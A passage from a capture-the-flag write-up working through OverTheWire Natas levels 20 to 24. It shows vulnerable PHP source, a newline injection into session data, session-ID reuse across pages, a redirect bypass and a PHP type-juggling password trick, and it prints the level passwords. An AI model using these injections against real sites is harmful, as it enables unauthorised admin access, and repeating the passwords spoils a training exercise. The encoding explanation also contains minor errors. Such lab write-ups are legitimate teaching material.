</span><span class='line'><span class="k">function</span> <span class="nf">mydestroy</span><span class="p">(</span><span class="nv">$sid</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">//debug(&quot;MYDESTROY $sid&quot;); </span>
</span><span class='line'>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cm">/* we don&#39;t need this */</span>
</span><span class='line'><span class="k">function</span> <span class="nf">mygarbage</span><span class="p">(</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">//debug(&quot;MYGARBAGE $t&quot;); </span>
</span><span class='line'>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nb">session_set_save_handler</span><span class="p">(</span>
</span><span class='line'>    <span class="s2">&quot;myopen&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;myclose&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;myread&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;mywrite&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;mydestroy&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;mygarbage&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Name set to &quot;</span> <span class="o">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">print_credentials</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$name</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>This is similar to the previous challenges, we still need the $_SESSION array to contain a key named <em>admin</em> with the value of 1. The code writes the session data to a file and that is where it will read the session ID from (the name of the file is the session ID). First, let&rsquo;s look at the debug output when we change our name: <a href="http://natas20.natas.labs.overthewire.org/index.php?name=admin&amp;debug">http://natas20.natas.labs.overthewire.org/index.php?name=admin&amp;debug</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>DEBUG: MYREAD sjj8g13u1f3ueiogqdfgf3jin1 // debug("MYREAD $sid"); 
</span><span class='line'>DEBUG: Reading from /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1 // debug("Reading from ". $filename);
</span><span class='line'>DEBUG: Read [name admin] // debug("Read [$line]");
</span><span class='line'>DEBUG: Read [] // debug("Read [$line]");
</span><span class='line'>DEBUG: Name set to admin // debug("Name set to " . $_REQUEST["name"]);
</span><span class='line'>
</span><span class='line'>DEBUG: MYWRITE sjj8g13u1f3ueiogqdfgf3jin1 name|s:5:"admin"; // debug("MYWRITE $sid $data"); 
</span><span class='line'>DEBUG: Saving in /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1 // debug("Saving in ". $filename);
</span><span class='line'>DEBUG: name =&gt; admin // debug("$key =&gt; $value");</span></code></pre></td></tr></table></div></figure>


<p>I placed the corresponding PHP code to the same line with the output for convenience. Now to analyze the relevant code:</p>

<ul>
<li><p><strong>function mywrite($sid, $data)</strong> &ndash; after checking that the session ID contains alphanumeric characters only, it sets the path where the session data will be used. The file looks like <em>mysess_SID</em>, see in the output above. Then it sorts the $_SESSION array by its keys and iterates over the array as key => value. In my example, you can see from the output <code>name => admin</code> that <em>name</em> is the key and <em>admin</em> is the value. Then the key and value are written to the file as follows: <code>$data .= &ldquo;$key $value\n&rdquo;;</code>. So the data will look like this: <em>name admin</em> followed by a newline.</p></li>
<li><p><strong>function myread($sid)</strong> &ndash; this function reads the data from the file and breaks the string into an array, split by the delimiter, which in this case is the newline. Then the key and value are separated by a space. Basically, this reads what was written earlier in the file</p></li>
</ul>


<p>We want to focus on the <em>mywrite</em> function because that&rsquo;s the actual code that writes the data that we passed to the server. And the code that needs our attention is this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> =&gt; </span><span class="si">$value</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> </span><span class="si">$value</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We know that to get the password for the next level, the $_SESSION array has to contain a key / value pair of <em>admin => 1</em>. And the <em>mywrite</em> function does the writing of this data for us..so all we need is to find a way to inject it. But if you look at how data is written to the file, you will notice the newline delimiter&hellip;what if we can inject another key / value pair after our initial input? We currently have this: <em>name => admin</em> by entering <em>admin</em> in the form. But if we add a newline character we can then insert a new key / value pair that matches the expectations of the server in order to give us the password. So what we want to inject is <code>admin\nadmin 1</code>. And then the session data would look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>name admin
</span><span class='line'>admin 1</span></code></pre></td></tr></table></div></figure>


<p>Since we need to URL encode the carriage return and space, the injection looks like this: <code>admin%0dadmin%201</code>. So I passed it to the URL like this: natas20.natas.labs.overthewire.org/index.php?debug&amp;name=admin%0Aadmin%201 and here&rsquo;s the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>DEBUG: MYREAD sjj8g13u1f3ueiogqdfgf3jin1
</span><span class='line'>DEBUG: Reading from /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1
</span><span class='line'>DEBUG: Read [name admin]
</span><span class='line'>DEBUG: Read [admin 1]
</span><span class='line'>DEBUG: Read []
</span><span class='line'>DEBUG: Name set to admin admin 1
</span><span class='line'>You are an admin. The credentials for the next level are:
</span><span class='line'>
</span><span class='line'>Username: natas21
</span><span class='line'>Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
</span><span class='line'>
</span><span class='line'>DEBUG: MYWRITE sjj8g13u1f3ueiogqdfgf3jin1 name|s:13:"admin admin 1";admin|s:1:"1";
</span><span class='line'>DEBUG: Saving in /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1
</span><span class='line'>DEBUG: admin =&gt; 1
</span><span class='line'>DEBUG: name =&gt; admin admin 1</span></code></pre></td></tr></table></div></figure>


<p>And we successfully acquired the next password: <code>IFekPyrQXftziDEsUr3x21sYuahypdgJ</code></p>

<h3>Level 21</h3>

<p><img class="center" src="/images/overthewire/natas/natas21.png" title="natas21" alt="natas 21"></p>

<p>We need to satisfy the same requirements as before to get next password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">print_credentials</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;Username: natas22</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'><span class="nx">print_credentials</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="/images/overthewire/natas/natas21css.png" title="natas21css" alt="natas 21css"></p>

<p>This page allows you to play with some CSS values. Also the session ID for this page is different than the other one.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// if update was submitted, store it</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;submit&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;[DEBUG] Session contents:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">print_r</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// only allow these keys</span>
</span><span class='line'><span class="nv">$validkeys</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;align&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;center&quot;</span><span class="p">,</span> <span class="s2">&quot;fontsize&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;100%&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;yellow&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$form</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$form</span> <span class="o">.=</span> <span class="s1">&#39;&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">foreach</span><span class="p">(</span><span class="nv">$validkeys</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$defval</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$val</span> <span class="o">=</span> <span class="nv">$defval</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$val</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$form</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$key</span><span class="s2">: &lt;input name=&#39;</span><span class="si">$key</span><span class="s2">&#39; value=&#39;</span><span class="si">$val</span><span class="s2">&#39; /&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nv">$form</span> <span class="o">.=</span> <span class="s1">&#39;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Update&quot; /&gt;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$form</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/form&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$style</span> <span class="o">=</span> <span class="s2">&quot;background-color: &quot;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;bgcolor&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;; text-align: &quot;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;align&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;; font-size: &quot;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;fontsize&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$example</span> <span class="o">=</span> <span class="s2">&quot;&lt;div style=&#39;</span><span class="si">$style</span><span class="s2">&#39;&gt;Hello world!&lt;/div&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>If you turn on debug, you can see the contents of the $_SESSION array:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[DEBUG] Session contents:
</span><span class='line'>Array ( [align] =&gt; center [fontsize] =&gt; 100% [bgcolor] =&gt; blue [submit] =&gt; Update ) </span></code></pre></td></tr></table></div></figure>


<p>Again we want to insert the pair <em>admin => 1</em> in the array, but the code only allows those 3 keys, so we can&rsquo;t POST what we want. But if we look at this code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1">// if update was submitted, store it</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;submit&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>As long as the key <em>submit</em> exists in the $<em>REQUEST array, it will take the key / value pairs in the $</em>REQUEST array and set them in the $_SESSION array. This is exactly what we want! But we can&rsquo;t POST our values because of the validity checks. Reading through the PHP manual I saw this:</p>

<blockquote><p>$<em>REQUEST  An associative array that by default contains the contents of $</em>GET, $<em>POST and $</em>COOKIE.</p>

<p>The variables in $_REQUEST are provided to the script via the GET, POST, and COOKIE input mechanisms and therefore could be modified by the remote
user and cannot be trusted.</p></blockquote>

<p>Well, we have control of what gets passed to $_REQUEST, and the code inserts whatever we give it as long as the key <em>submit</em> exists. Instead of POST&#8217;ing, I modified the HTML using Firebug to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>bgcolor:
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span> <span class="na">name=</span><span class="s">&quot;admin&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>On the CSS page a new session ID was issued: <code>4nhuf71ckmm80osqvn1s8s8bd6</code>. I pasted it in the session ID of the page that should give us credentials and refreshed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You are an admin. The credentials for the next level are:
</span><span class='line'>
</span><span class='line'>Username: natas22
</span><span class='line'>Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</span></code></pre></td></tr></table></div></figure>


<h3>Level 22</h3>

<p><img class="center" src="/images/overthewire/natas/natas22.png" title="natas22" alt="natas 22"></p>

<p>Pretty blank, eh? Let&rsquo;s look at the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;revelio&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// only admins can reveal the password</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">header</span><span class="p">(</span><span class="s2">&quot;Location: /&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;revelio&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;Username: natas23</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, it looks like all you have to do is pass a GET parameter named <em>revelio</em> and receive the password. But if you&rsquo;re not an admin, you will just be redirected to the same page via a Location header. I couldn&rsquo;t think of a way to fool the page that I&rsquo;m admin, but I tried messing with the headers,URL and session ID, with no success. However, when I just decided to look at the response to my request in Burp, the answer was in the HTML:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You are an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas23
</span><span class='line'>Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE&lt;/pre&gt;</span></code></pre></td></tr></table></div></figure>


<p>After receiving this response the browser made another request..but at this point it didn&rsquo;t matter :D</p>

<h3>Level 23</h3>

<p><img class="center" src="/images/overthewire/natas/natas23.png" title="natas23" alt="natas 23"></p>

<p>Here we have to input a password to login. Let&rsquo;s see the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
</span><span class='line'>    if(array_key_exists("passwd",$_REQUEST)){
</span><span class='line'>        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] &gt; 10 )){
</span><span class='line'>            echo "&lt;br&gt;The credentials for the next level are:&lt;br&gt;";
</span><span class='line'>            echo "&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;";
</span><span class='line'>        }
</span><span class='line'>        else{
</span><span class='line'>            echo "&lt;br&gt;Wrong!&lt;br&gt;";
</span><span class='line'>        }
</span><span class='line'>    }
</span><span class='line'>    // morla / 10111
</span><span class='line'>?&gt;  </span></code></pre></td></tr></table></div></figure>


<p>We will get the credentials if we enter a password that contains the string <em>iloveyou</em> and that is larger than 10. But how can a string be compared to an integer? PHP manual to the rescue! According to the <a href="https://secure.php.net/manual/en/language.operators.comparison.php">Comparison Operators</a> section:</p>

<blockquote><p>If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison
performed numerically.</p></blockquote>

<p><a href="https://secure.php.net/manual/en/language.types.string.php#language.types.string.conversion">So how is the string converted to a number?</a></p>

<blockquote><p>If the string does not contain any of the characters &lsquo;.&rsquo;, &lsquo;e&rsquo;, or &lsquo;E&rsquo; and the numeric value fits into integer type limits (as defined by
PHP_INT_MAX), the string will be evaluated as an integer. In all other cases it will be evaluated as a float.</p>

<p>The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the
value will be 0 (zero).</p></blockquote>

<p>So all we have to do is enter a password that starts with a number greater than 50, followed by the <em>iloveyou</em> string, something like <em>50iloveyou</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>The credentials for the next level are:
</span><span class='line'>
</span><span class='line'>Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg</span></code></pre></td></tr></table></div></figure>


<p>// (I thought at the beginning that the comment was related to the challenge, but it turns out that&rsquo;s the handle of the creator of the challenge).</p>

<h3>Level 24</h3>

<p><img class="center" src="/images/overthewire/natas/natas23.png" title="natas24" alt="natas 24"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;passwd&quot;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">)){</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;passwd&quot;</span><span class="p">],</span><span class="s2">&quot;&lt;censored&gt;&quot;</span><span class="p">)){</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">else</span><span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;Wrong!&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
